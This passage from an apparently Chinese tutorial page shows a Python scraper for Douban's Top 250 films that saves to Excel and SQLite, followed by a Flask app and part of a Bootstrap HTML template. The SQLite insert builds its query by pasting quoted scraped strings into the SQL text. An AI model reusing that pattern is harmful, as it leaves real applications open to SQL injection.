punctuation">)</span><span class="token punctuation">:</span>    head<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4128.3 Safari/537.36"</span>    <span class="token punctuation">&#125;</span>    request<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>head<span class="token punctuation">)</span>    html<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        html<span class="token operator">=</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token string">"code"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>code<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token string">"reason"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span>    <span class="token keyword">return</span> html<span class="token keyword">def</span> <span class="token function">getData</span><span class="token punctuation">(</span>baseurl<span class="token punctuation">)</span><span class="token punctuation">:</span>    data_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url<span class="token operator">=</span>baseurl<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">25</span><span class="token punctuation">)</span>        html<span class="token operator">=</span>askURL<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        soup<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span><span class="token string">"html.parser"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> item <span class="token keyword">in</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"item"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>             <span class="token comment">#保存一部电影的所有信息</span>            item<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>            link<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findLink<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>   <span class="token comment">#影片详情的超链接</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>link<span class="token punctuation">)</span>            imgSrc<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findImgSrc<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>imgSrc<span class="token punctuation">)</span>            titles<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findTitle<span class="token punctuation">,</span>item<span class="token punctuation">)</span>    <span class="token comment">#片名可能只有一个中文名，没有外文名</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>titles<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                chinese_title<span class="token operator">=</span>titles<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chinese_title<span class="token punctuation">)</span>                foreign_title<span class="token operator">=</span>titles<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#去除无关符号</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>foreign_title<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>titles<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>                <span class="token comment">#外文名留空</span>            rating<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findRating<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>rating<span class="token punctuation">)</span>            judgeNum<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findJudge<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>judgeNum<span class="token punctuation">)</span>            Induct<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findInduct<span class="token punctuation">,</span>item<span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Induct<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                Induct<span class="token operator">=</span>Induct<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"。"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Induct<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>            Bd<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findBd<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            Bd<span class="token operator">=</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">"&lt;br(\s+)?/>(\s+)?"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span>Bd<span class="token punctuation">)</span>            Bd<span class="token operator">=</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span>Bd<span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Bd<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token comment">#去掉前后的空格</span>            data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>     <span class="token keyword">return</span> data_list<span class="token keyword">def</span> <span class="token function">saveData</span><span class="token punctuation">(</span>data_list<span class="token punctuation">,</span>savepath<span class="token punctuation">)</span><span class="token punctuation">:</span>    workbook<span class="token operator">=</span>xlwt<span class="token punctuation">.</span>Workbook<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    worksheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>add_sheet<span class="token punctuation">(</span><span class="token string">'top250'</span><span class="token punctuation">,</span>cell_overwrite_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    col<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'电影详细链接'</span><span class="token punctuation">,</span><span class="token string">'图片链接'</span><span class="token punctuation">,</span><span class="token string">'影片中文名'</span><span class="token punctuation">,</span><span class="token string">'影片外文名'</span><span class="token punctuation">,</span><span class="token string">'评分'</span><span class="token punctuation">,</span><span class="token string">'评价数'</span><span class="token punctuation">,</span><span class="token string">'概况'</span><span class="token punctuation">,</span><span class="token string">'相关信息'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        worksheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>col<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'第</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">条'</span></span><span class="token punctuation">)</span>        data<span class="token operator">=</span>data_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            worksheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span>data<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>savepath<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">saveData2DB</span><span class="token punctuation">(</span>data_list<span class="token punctuation">,</span>dbpath<span class="token punctuation">)</span><span class="token punctuation">:</span>    init_db<span class="token punctuation">(</span>dbpath<span class="token punctuation">)</span>    conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>dbpath<span class="token punctuation">)</span>    cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> data <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>        <span class="token keyword">for</span> index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> index<span class="token operator">==</span><span class="token number">4</span> <span class="token keyword">or</span> index<span class="token operator">==</span><span class="token number">5</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            data<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'"'</span><span class="token operator">+</span>data<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'"'</span>        sql<span class="token operator">=</span><span class="token triple-quoted-string string">'''            insert into movie250 (info_link,pic_link,            cname,fname,score,rated,introdu,info)             values(%s)'''</span><span class="token operator">%</span><span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">init_db</span><span class="token punctuation">(</span>dbpath<span class="token punctuation">)</span><span class="token punctuation">:</span>    sql<span class="token operator">=</span><span class="token triple-quoted-string string">'''        create table movie250(            id integer primary key autoincrement,            info_link text,            pic_link text,            cname varchar,            fname varchar,            score numeric,            rated numeric,            introdu text,            info text        );    '''</span>    conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>dbpath<span class="token punctuation">)</span>    cursor<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Flask框架–豆瓣电影Top250数据可视化-完整项目文件"><a href="#Flask框架–豆瓣电影Top250数据可视化-完整项目文件" class="headerlink" title="Flask框架–豆瓣电影Top250数据可视化(完整项目文件)"></a>Flask框架–豆瓣电影Top250数据可视化(<a href="https://cdn.jsdelivr.net/gh/ezy0812/CDN/python-project-files/doubantop250.zip">完整项目文件</a>)</h2><h3 id="app-py"><a href="#app-py" class="headerlink" title="app.py"></a>app.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token keyword">import</span> sqlite3app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/movie'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">movie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    datalist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"movie.db"</span><span class="token punctuation">)</span>    cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    sql <span class="token operator">=</span> <span class="token string">"select * from movie250"</span>    data <span class="token operator">=</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> data<span class="token punctuation">:</span>        datalist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"movie.html"</span><span class="token punctuation">,</span> movies<span class="token operator">=</span>datalist<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/score'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">score</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    score <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"movie.db"</span><span class="token punctuation">)</span>    cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    sql <span class="token operator">=</span> <span class="token string">"select score,count(score) from movie250 group by score"</span>    data <span class="token operator">=</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> data<span class="token punctuation">:</span>        score<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        num<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"score.html"</span><span class="token punctuation">,</span> score<span class="token operator">=</span>score<span class="token punctuation">,</span> num<span class="token operator">=</span>num<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/word'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">word</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"word.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/team'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">team</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"team.html"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Mamba Bootstrap Template - Index<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>descriptison<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>keywords<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Favicons --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/favicon.png<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/apple-touch-icon.png<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>apple-touch-icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Google Fonts --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,600,600i,700,700i,900<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Vendor CSS Files --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/bootstrap/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/icofont/icofont.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/boxicons/css/boxicons.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/animate.css/animate.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/venobox/venobox.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/aos/aos.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Template Main CSS File --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/css/style.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- =======================================================  * Template Name: Mamba - v2.0.1  * Template URL: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/  * Author: BootstrapMade.com  * License: https://bootstrapmade.com/license/  ======================================================== --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- ======= Header ======= --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo float-left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-light<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Mamba<span class="token tag"><span 